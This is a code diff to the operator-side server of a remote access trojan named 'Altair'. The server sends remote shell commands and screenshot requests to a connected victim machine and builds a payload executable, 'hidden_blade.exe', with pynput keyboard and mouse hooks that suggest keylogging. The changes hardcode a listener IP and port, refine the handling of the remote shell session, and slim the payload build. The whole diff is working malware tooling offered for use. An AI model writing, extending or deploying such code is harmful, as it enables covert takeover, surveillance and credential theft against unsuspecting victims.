@@ -1,17 +1,13 @@
-## güncelleme denemesi ##
 from getpass import getuser
 from time import sleep
-from threading import Thread
-from time import strftime
+from util import versionControl,Console,AltairCommandList
 import os
 import sys
 import socket
 import random
 import ast
 import folium
-import re
 import PyInstaller.__main__
-from util import versionControl,Console,AltairCommandList
 import shutil
 
 ##------------------------------------Global Scope-------------------------------##
@@ -28,7 +24,7 @@ c$$$cc$$$c  '''    $  '''    $c$$$cc$$$c  '''    $  '''    $$$$  $$$ "Y$c$$
 \t\tgithub: https://github.com/Arif-Helmsys
 \t\t     Assassin Name: Altair
 """
-ip = ""
+ip = "192.168.1.5"
 port = 1881
 state = False
 print(f"{random.choice(Console.SHAKER)}{banner}")
@@ -61,7 +57,7 @@ class Server(socket.socket):
             elif _input == Console.EXECUTE:
                 if not os.path.exists("hidden_blade.exe"):
                     print(f"\t{Console.CYAN}  ╰──/{Console.CYAN}Creating Execute...{Console.DEFAULT}".expandtabs(5))
-                    PyInstaller.__main__.run(['hidden_blade.py',"--hidden-import",'pynput.keyboard._win32',"--hidden-import",'pynput.mouse._win32','--onefile'])
+                    PyInstaller.__main__.run(['hidden_blade.py',"--hidden-import",'pynput.keyboard._win32',"--hidden-import",'pynput.mouse._win32','--onefile','--exclude-module','matplotlib','--exclude-module','scipy'])
                     print(f"\t{Console.CYAN}  ╰──/{Console.CYAN}Execute file created".expandtabs(5))
                     shutil.copy(f"{os.getcwd()}\\dist\\hidden_blade.exe",f"{os.getcwd()}\\hidden_blade.exe")
                     shutil.rmtree("dist")
@@ -110,7 +106,10 @@ class Server(socket.socket):
                         print(f"{Console.CYAN}\t      ╰──/{Console.YELLOW}Please No Epmty")
                     else:
                         client_socket.send(c.encode())
-                        print(f"{client_socket.recv(18432).decode()}")
+                        resp = client_socket.recv(18432).decode()
+                        if resp == "exited":
+                            break
+                        print(f"{resp}")
 
             elif _input == AltairCommandList.SS:
                 client_socket.send(AltairCommandList.SS.encode())
@@ -154,7 +153,7 @@ class Server(socket.socket):
             elif _input == AltairCommandList.EXIT:
                 client_socket.send(_input.encode())
                 print(f"{Console.YELLOW}[SERVER]~Lost connection with Altair")
-                self.terminalUsing()
+                return self.terminalUsing()
             
             else:
                 print(f"{Console.CYAN}\t╰──/{Console.YELLOW}Unknow Command".expandtabs(12))
